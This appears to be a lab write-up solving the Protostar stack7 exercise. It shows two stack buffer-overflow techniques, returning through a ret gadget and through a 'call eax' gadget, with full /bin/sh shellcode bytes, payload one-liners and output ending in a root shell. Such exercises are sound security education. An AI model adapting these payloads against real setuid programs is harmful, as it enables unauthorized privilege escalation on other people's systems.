- Similar to stack6, + tight restriction on return address:
    (ret & 0xb0000000) != 0xb0000000)
- return to .text code execution

Method 1)
===================    
- download file locally to search opcodes
# scp user@172.16.121.129:/opt/protostar/bin/stack7 .
# objdump -M intel -d stack7 | grep -i "ret"
 8048383:	c3                   	ret    

- get EIP offset 
# ./pattern_create.rb 100
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A

$ python -c 'print "A"*80 + "\x83\x83\x04\x08" + "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A"' | ./stack7
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��AAAAAAAAAAAA��Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
Segmentation fault (core dumped)

$ gdb --quiet --core=/tmp/core.11.stack7.1588 
Core was generated by `./stack7'.
Program terminated with signal 11, Segmentation fault.
#0  0x41306141 in ?? ()
(gdb) 

# ./pattern_offset.rb 0x41306141
0

- ret will execute code from the address represented by the first 4 bytes of buffer.
- So we build the paylod like this:  
| fillen (len 80) | address of a ret instruction | address of shellcode in env var |

$ export SC=`python -c 'print  "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"'`
user@protostar:/opt/protostar/bin$ ~/getenvaddr SC ./stack7 
SC will be at 0xbfffff57

Wrapping up: 
$ python -c 'print  "A" * 80 + "\x83\x83\x04\x08" + "\x57\xff\xff\xbf"' | ./stack7input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��AAAAAAAAAAAA��W���
# id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
# whoami
root
# 


Method 2
===================
Derived from: http://louisrli.github.com/sideprojects/2012/08/28/protostar-stack2/
- return value of the function is stored in EAX
==> return strdup(buffer); puts in EAX the address of the shellcode ==> we need to call eax
# objdump -d stack7 | grep "call.*eax"
 8048478:	ff 14 85 5c 96 04 08 	call   *0x804965c(,%eax,4)
 80484bf:	ff d0                	call   *%eax
 80485eb:	ff d0                	call   *%eax

We build the payload as:
| shellcode (length n) | filler (length 80-n) | address of call eax instruction |

$ python -c 'print  "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80" + "X" * (80-55) + "\xbf\x84\x04\x08"' | ./stack7
input path please: got path 1�1۰̀Sh/ttyh/dev��1�f�'�̀1�Ph//shh/bin��PS�ᙰ

# id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
# whoami
root
# 

